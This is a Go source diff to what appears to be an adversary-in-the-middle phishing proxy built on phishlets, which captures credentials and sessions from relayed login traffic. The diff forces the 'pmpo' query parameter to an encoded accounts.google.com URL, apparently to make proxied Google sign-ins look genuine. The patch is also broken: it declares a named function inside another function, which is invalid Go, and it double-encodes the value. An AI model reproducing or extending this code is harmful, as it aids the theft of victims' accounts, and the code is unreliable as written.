@@ -641,38 +641,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// // patch GET query params with original domains
-				// if pl != nil {
-				// 	qs := req.URL.Query()
-				// 	if len(qs) > 0 {
-				// 		for gp := range qs {
-				// 			for i, v := range qs[gp] {
-				// 				qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-				// 			}
-				// 		}
-				// 		req.URL.RawQuery = qs.Encode()
-				// 	}
-				// }
-
 				// patch GET query params with original domains
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
-								if gp == "pmpo" {
-									// Modify the 'pmpo' parameter value
-									qs[gp][i] = "https%3A%2F%2Faccounts.google.com"
-								} else {
-									// Apply the patchUrls function to other parameters
-									qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-								}
+								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
-
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
@@ -1096,6 +1076,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Function to replace a specific GET parameter in the request URL
+			func replaceGetParam(req *http.Request, paramName, newValue string) {
+				qs := req.URL.Query() // Get the query parameters
+
+				if _, exists := qs[paramName]; exists {
+					qs.Set(paramName, newValue) // Replace the value of the target parameter
+					req.URL.RawQuery = qs.Encode() // Update the URL with the new query string
+				}
+			}
+
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
@@ -1168,6 +1158,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 						body = []byte(removeObfuscatedDots(string(body)))
+
+						// Additional step to replace a specific GET parameter
+						replaceGetParam(req, "pmpo", "https%3A%2F%2Faccounts.google.com")
 					}
 				}
 
